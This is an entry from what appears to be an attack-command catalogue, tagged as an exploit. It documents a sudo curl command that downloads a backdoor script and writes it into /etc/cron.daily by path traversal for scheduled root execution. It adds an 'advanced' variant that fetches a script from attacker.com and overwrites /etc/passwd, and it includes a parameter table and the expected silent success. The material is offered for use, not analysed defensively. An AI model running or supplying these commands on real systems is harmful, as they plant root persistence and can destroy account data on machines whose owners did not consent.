---
data: >-
  sudo curl http://localhost:8000/backdoor.sh -o
  "../../etc/cron.daily/zzz-backdoor"
tags:
  - exploit
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.438Z'
id: 7f192f8e-4e13-4066-92d5-980157bbb2c7
verified: false
validated: true
submitted: true
---
# sudo-curl-cron-backdoor

## Command

```bash
sudo curl http://localhost:8000/backdoor.sh -o "../../etc/cron.daily/zzz-backdoor"
```

## Description

Downloads a backdoor script via cURL with sudo and writes it to cron directory using path traversal, enabling root RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sudo` | Elevate to root | Yes |
| `-o` | Output file path with traversal | Yes |
| `http://localhost:8000/backdoor.sh` | Source URL | Yes |
| `"../../etc/cron.daily/zzz-backdoor"` | Target path | Yes |

## Examples

### Basic Usage

```bash
sudo curl http://localhost:8000/backdoor.sh -o "../../etc/cron.daily/zzz-backdoor"
```

### Advanced Usage

```bash
sudo curl -s http://attacker.com/script.sh -o "/etc/passwd"
```

## Expected Output

Silent on success; file written, cron executes on schedule.

## Related

- [[commands/python3-http-server]]
